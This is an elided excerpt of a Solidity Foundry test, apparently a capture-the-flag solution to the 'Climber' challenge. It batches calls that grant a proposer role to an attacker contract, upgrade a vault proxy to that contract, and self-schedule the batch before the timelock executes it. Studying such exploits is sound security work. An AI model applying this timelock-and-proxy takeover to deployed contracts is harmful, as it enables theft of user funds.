...
contract Climber is Test {
    ...
    function testExploit() public {
        ...
        values[1]=0;
        dataElements[1]=abi.encodeWithSignature("grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(hack));

        targets[2]=address(climberVaultProxy);
        values[2]=0;
        dataElements[2]=abi.encodeWithSignature("upgradeTo(address)", address(hack));

        targets[3]=address(hack);
        values[3]=0;
        dataElements[3]=abi.encodeWithSignature("scheduleViaHack(address)", address(climberTimelock));

        hack.initClimber(targets, values, dataElements, keccak256(abi.encodePacked(uint(0))));
        climberTimelock.execute(targets, values, dataElements, keccak256(abi.encodePacked(uint(0))));
